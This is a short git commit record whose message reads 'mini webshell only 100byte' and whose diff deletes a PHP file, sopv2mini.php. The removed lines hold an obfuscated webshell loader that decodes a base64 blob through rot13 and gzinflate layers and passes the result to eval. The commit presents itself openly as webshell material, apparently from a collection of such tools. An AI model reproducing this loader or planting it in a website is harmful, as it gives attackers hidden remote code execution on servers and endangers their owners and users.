1fde646aa404e7341ab819c1bdce5688ac32b931
0x86 <51450260+root-x-krypt0n-x@users.noreply.github.com>
2023-02-05 04:15:23 +0000

    mini webshell only 100byte

--- sopv2mini.php
+++
@@ -1,2 +0,0 @@
-<?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode("LclODoMgEAXQu7DSBVnjslrsRAhQmK/FQzMVIp7eWt/26U36YN6zZL/W1R8Kv2aABshgKhDlVpTKxx0NaPkuoun/YeeLEjN5tnTaIh7BcxKOXqr2QUp2gdbJIcOM4+sG")))));
